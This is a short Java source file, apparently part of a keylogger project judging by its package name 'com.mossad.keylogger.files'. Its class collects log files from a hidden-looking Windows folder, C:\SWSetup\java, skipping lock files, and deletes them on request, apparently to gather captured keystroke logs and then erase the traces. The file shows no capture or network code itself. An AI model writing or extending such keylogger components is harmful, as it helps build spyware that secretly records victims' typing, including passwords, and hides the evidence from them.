package com.mossad.keylogger.files;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public final class LogFilesCollector {


    public LogFilesCollector() {

    }

    public List<String> collectLogs() {
        Path currentRelativePath = Paths.get("C:\\SWSetup\\java");
        try {
            Stream<Path> paths = Files.list(currentRelativePath);
            return paths.map(path -> path.toString()).filter(path -> !path.endsWith(".lck")).collect(Collectors.toList());

        } catch (IOException e) {
            return List.of();
        }
    }

    public void removeLogs(List<String> filesNames) {
        filesNames.forEach(path -> {
            try {
                Files.delete(Paths.get(path));
            } catch (IOException e) {
                e.printStackTrace();
            }
        });
    }

}
